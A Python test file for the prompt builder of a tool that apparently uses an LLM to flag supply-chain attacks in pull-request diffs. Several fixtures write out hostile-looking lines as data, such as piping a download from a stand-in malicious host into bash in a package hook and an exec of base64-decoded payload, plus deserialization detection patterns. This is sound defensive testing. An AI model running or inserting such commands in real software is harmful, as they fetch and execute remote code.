"""Tests de watchgate/core/layers/_semantic/prompting.py (spec §7.1)."""

from __future__ import annotations

from watchgate.core.layers._semantic.prompting import (
    build_system_prompt,
    build_user_prompt,
    load_few_shot_examples,
)
from watchgate.core.models import FileChange, FileStatus, NormalizedDiff
from watchgate.core.rag.retriever import RetrievedFragment


def _diff_with_files(*files: FileChange) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="a" * 40,
        head_sha="b" * 40,
        repo_path="/tmp/repo",
        files=list(files),
        commit_messages=["fix: cosa"],
        authors=[],
    )


def test_build_system_prompt_renders_placeholders():
    prompt = build_system_prompt(
        project_type="librería Python",
        languages="Python",
        recent_activity_summary="3 PRs fusionados esta semana",
        rag_context=[],
    )
    assert "librería Python" in prompt
    assert "3 PRs fusionados esta semana" in prompt
    assert "(sin casos relevantes recuperados)" in prompt
    assert '"risk_score"' in prompt


def test_build_system_prompt_includes_real_current_date_by_default():
    """Sin fecha real, el modelo compara timestamps de paquetes/releases
    contra su propio corte de entrenamiento -- reproducido contra un PR
    benigno real (bump de dependencias con timestamps de 2026 marcado como
    'manipulación de la cadena de suministro'). Por defecto usa la fecha
    real de hoy (UTC), no una fija a mano."""
    from datetime import UTC, datetime

    prompt = build_system_prompt("app", "Python", "sin datos", [])
    today = datetime.now(UTC).date().isoformat()
    assert today in prompt
    assert "no asumas que una fecha posterior" in prompt


def test_build_system_prompt_accepts_explicit_current_date_for_deterministic_tests():
    prompt = build_system_prompt("app", "Python", "sin datos", [], current_date="2099-01-01")
    assert "2099-01-01" in prompt


def test_build_system_prompt_always_includes_the_verification_reminder():
    """Hallazgo de la comparativa con/sin RAG (docs/rag_ablation_benchmark.md):
    el modelo puede inflar el risk_score solo por reconocer el nombre de una
    técnica conocida, sin verificar si surte efecto de verdad en ese diff.
    Este recordatorio debe estar siempre, tenga o no contexto RAG."""
    prompt = build_system_prompt("app", "Python", "sin datos", [])
    assert "no por la etiqueta de la técnica que reconoces" in prompt


def test_build_system_prompt_includes_rag_fragments():
    fragments = [RetrievedFragment(text="curl | bash en PKGBUILD", case_name="atomic_arch")]
    prompt = build_system_prompt("app", "Go", "sin actividad reciente", fragments)
    assert "atomic_arch" in prompt
    assert "curl | bash en PKGBUILD" in prompt


def test_build_system_prompt_deduplicates_overlap_between_same_case_fragments():
    """Optimización de tokens sin perder contexto: dos chunks del mismo
    documento con texto solapado (típico de chunks adyacentes, por el
    solape deliberado de indexer.py) no deben repetir ese texto en el
    prompt -- pero ninguna frase única de ninguno de los dos debe perderse."""
    shared_tail = "## Por qué es relevante para WatchGate y tal, frase compartida de verdad larga"
    fragment_a = RetrievedFragment(
        text=f"Frase exclusiva de A, antes del solape. {shared_tail}",
        case_name="doc_x",
    )
    fragment_b = RetrievedFragment(
        text=f"{shared_tail} Frase exclusiva de B, después del solape.",
        case_name="doc_x",
    )
    prompt = build_system_prompt("app", "Python", "sin datos", [fragment_a, fragment_b])

    assert prompt.count(shared_tail) == 1
    assert "Frase exclusiva de A" in prompt
    assert "Frase exclusiva de B" in prompt


def test_build_system_prompt_deduplicates_overlap_regardless_of_retrieval_order():
    """La recuperación por similitud no garantiza el orden del documento: el
    fragmento que va DESPUÉS en el documento puede llegar primero en la lista
    (caso real observado con xz_utils.md). Aquí el solape está al FINAL del
    segundo fragmento en vez de al principio -- rama distinta de
    _strip_known_overlap a la que cubre el test anterior."""
    shared_tail = "## Por qué es relevante para WatchGate y tal, frase compartida de verdad larga"
    fragment_first_in_list_but_later_in_doc = RetrievedFragment(
        text=f"{shared_tail} Frase exclusiva de A, después del solape.",
        case_name="doc_y",
    )
    fragment_second_in_list_but_earlier_in_doc = RetrievedFragment(
        text=f"Frase exclusiva de B, antes del solape. {shared_tail}",
        case_name="doc_y",
    )
    prompt = build_system_prompt(
        "app",
        "Python",
        "sin datos",
        [fragment_first_in_list_but_later_in_doc, fragment_second_in_list_but_earlier_in_doc],
    )

    assert prompt.count(shared_tail) == 1
    assert "Frase exclusiva de A" in prompt
    assert "Frase exclusiva de B" in prompt


def test_build_system_prompt_does_not_deduplicate_fragments_from_different_cases():
    """Dos fragmentos de casos DISTINTOS que por casualidad comparten texto
    no deben tocarse -- el solape solo es previsible entre chunks del mismo
    documento (indexer.py los trocea con solape a propósito)."""
    shared = "curl http://malicious.example | bash en el post_install del paquete"
    fragment_a = RetrievedFragment(text=shared, case_name="caso_a")
    fragment_b = RetrievedFragment(text=shared, case_name="caso_b")
    prompt = build_system_prompt("app", "Python", "sin datos", [fragment_a, fragment_b])

    assert prompt.count(shared) == 2


def test_build_system_prompt_collapses_redundant_blank_lines_in_rag_fragments():
    fragment = RetrievedFragment(
        text="Primera línea.\n\n\n\nSegunda línea, tras varias líneas en blanco.",
        case_name="doc_y",
    )
    prompt = build_system_prompt("app", "Python", "sin datos", [fragment])
    assert "Primera línea.\n\nSegunda línea, tras varias líneas en blanco." in prompt
    assert "Primera línea.\n\n\n" not in prompt


def test_build_system_prompt_labels_confirmed_feedback_cases_differently():
    fragments = [
        RetrievedFragment(
            text="curl | bash en post_install",
            case_name="PR #42 en el propio repo",
            origin="feedback",
            verdict="true_positive",
        )
    ]
    prompt = build_system_prompt("app", "Go", "sin actividad reciente", fragments)
    assert "Caso propio" in prompt
    assert "confirmado por revisión humana como riesgo real" in prompt


def test_build_system_prompt_includes_dependency_findings_when_present():
    findings = [{"name": "bad-package", "ecosystem": "PyPI", "vulns_summary": "GHSA-aaaa"}]
    prompt = build_system_prompt("app", "Python", "sin datos", [], dependency_findings=findings)
    assert "bad-package" in prompt
    assert "GHSA-aaaa" in prompt
    assert "no una tool pedida por ti" in prompt


def test_build_system_prompt_omits_dependency_block_when_no_findings():
    prompt = build_system_prompt("app", "Python", "sin datos", [], dependency_findings=[])
    assert "Vulnerabilidades conocidas en dependencias" not in prompt


def test_build_system_prompt_includes_few_shot_examples_by_default():
    """FEW_SHOT_EXAMPLES se carga de datasets/few_shot/*.json (2 ficheros
    committeados); debe llegar de verdad al prompt, no quedarse sin usar."""
    prompt = build_system_prompt("app", "Python", "sin datos", [])
    assert "Ejemplos de referencia" in prompt
    assert "calculate_total" in prompt  # del fichero benign_rename_refactor.json
    assert "post_install" in prompt  # del fichero malicious_pkgbuild_curl_bash.json


def test_build_system_prompt_omits_few_shot_block_when_no_examples():
    prompt = build_system_prompt("app", "Python", "sin datos", [], few_shot_examples=[])
    assert "Ejemplos de referencia" not in prompt


def test_build_system_prompt_accepts_explicit_few_shot_examples():
    custom = [{"diff_summary": "cambio de prueba concreto", "expected_output": {"risk_score": 1}}]
    prompt = build_system_prompt("app", "Python", "sin datos", [], few_shot_examples=custom)
    assert "cambio de prueba concreto" in prompt


def test_load_few_shot_examples_reads_the_committed_dataset():
    examples = load_few_shot_examples()
    assert len(examples) >= 2
    for example in examples:
        assert "diff_summary" in example
        assert "expected_output" in example
        assert "risk_score" in example["expected_output"]


def test_load_few_shot_examples_returns_empty_for_missing_dir(tmp_path):
    assert load_few_shot_examples(tmp_path / "no_existe") == []


def test_build_user_prompt_includes_full_diff_when_under_token_budget():
    diff = _diff_with_files(
        FileChange(
            path="app.py",
            status=FileStatus.MODIFIED,
            diff_hunk="+import os",
            additions=1,
            deletions=0,
        )
    )
    prompt = build_user_prompt(
        diff, static_findings_paths=set(), count_tokens=lambda _: 10, max_diff_tokens=1000
    )
    assert "app.py" in prompt
    assert "+import os" in prompt
    assert "líneas adicionales" not in prompt


def test_build_user_prompt_truncates_unflagged_files_when_over_budget():
    flagged = FileChange(
        path="PKGBUILD",
        status=FileStatus.MODIFIED,
        diff_hunk="+curl http://evil.example | bash",
        additions=1,
        deletions=0,
    )
    unflagged = FileChange(
        path="README.md",
        status=FileStatus.MODIFIED,
        diff_hunk="+una línea\n+otra línea\n+otra más",
        additions=3,
        deletions=0,
    )
    diff = _diff_with_files(flagged, unflagged)

    prompt = build_user_prompt(
        diff,
        static_findings_paths={"PKGBUILD"},
        count_tokens=lambda t: len(t.split()),
        max_diff_tokens=25,
    )
    assert "curl http://evil.example | bash" in prompt
    assert "una línea" not in prompt
    assert "README.md" in prompt
    assert "no se ha podido leer de verdad" in prompt
    assert "no lo trates como una señal de que está limpio".lower() in prompt.lower()


def test_build_user_prompt_excerpts_suspicious_lines_in_unflagged_large_files():
    """Un fichero que no está en static_findings_paths (static_layer.py no
    existe todavía / no lo marcó) pero contiene un patrón de riesgo conocido
    (aquí, un exec() disfrazado entre líneas irrelevantes) no debe colapsarse
    en un resumen ciego -- debe aparecer un extracto real alrededor de la
    línea sospechosa, aunque el resto del fichero se omita."""
    padding_before = "\n".join(f"+línea inofensiva {i}" for i in range(30))
    padding_after = "\n".join(f"+línea inofensiva {i}" for i in range(30, 60))
    huge_file = FileChange(
        path="utils/big_module.py",
        status=FileStatus.MODIFIED,
        diff_hunk=f"{padding_before}\n+exec(base64.b64decode(payload))\n{padding_after}",
        additions=61,
        deletions=0,
    )
    diff = _diff_with_files(huge_file)

    prompt = build_user_prompt(
        diff, static_findings_paths=set(), count_tokens=lambda t: len(t.split()), max_diff_tokens=20
    )
    assert "exec(base64.b64decode(payload))" in prompt
    assert "extracto" in prompt
    assert "línea inofensiva 0\n" not in prompt  # el relleno lejos del match no entra


def test_build_user_prompt_offers_fetch_tool_hint_with_real_path_and_head_sha():
    """Tanto si se encuentra un extracto como si no, el prompt debe darle al
    LLM la llamada exacta a `fetch_referenced_file` (tool ya ofrecida
    siempre, §7.2) para leer el fichero entero bajo demanda -- no basta con
    decir 'no se pudo revisar', hay que decirle cómo resolverlo él mismo."""
    con_match = FileChange(
        path="src/payload.py",
        status=FileStatus.MODIFIED,
        diff_hunk="+" + "\n+".join([f"linea {i}" for i in range(50)] + ["literal_eval(x)"]),
        additions=51,
        deletions=0,
    )
    sin_match = FileChange(
        path="src/limpio.py",
        status=FileStatus.MODIFIED,
        diff_hunk="+" + "\n+".join(f"linea {i}" for i in range(50)),
        additions=50,
        deletions=0,
    )
    diff = _diff_with_files(con_match, sin_match)

    prompt = build_user_prompt(
        diff,
        static_findings_paths=set(),
        count_tokens=lambda t: len(t.split()),
        max_diff_tokens=200,
    )
    assert f'fetch_referenced_file(path="src/payload.py", ref="{"b" * 40}")' in prompt
    assert f'fetch_referenced_file(path="src/limpio.py", ref="{"b" * 40}")' in prompt


def test_find_suspicious_lines_recognizes_python_deserialization_patterns():
    """Hallazgo real de la suite de validación (tests/cases/): el escaneo
    original solo reconocía sintaxis de shell/instalación; varios payloads
    reales usaban literal_eval/pickle/marshal en Python puro y no se
    incluían en el extracto. Cubierto directamente vía build_user_prompt
    porque find_suspicious_lines vive en _shared.py (de Línea 3)."""
    for snippet in (
        "+x = literal_eval(raw)",
        "+obj = pickle.loads(blob)",
        "+obj = marshal.loads(blob)",
        "+data = base64.b64decode(encoded)",
    ):
        padding = "\n".join(f"+linea inofensiva {i}" for i in range(50))
        file_change = FileChange(
            path="mod.py",
            status=FileStatus.MODIFIED,
            diff_hunk=f"{padding}\n{snippet}\n{padding}",
            additions=101,
            deletions=0,
        )
        diff = _diff_with_files(file_change)
        prompt = build_user_prompt(
            diff,
            static_findings_paths=set(),
            count_tokens=lambda t: len(t.split()),
            max_diff_tokens=20,
        )
        assert snippet[1:] in prompt, f"no se detectó: {snippet}"
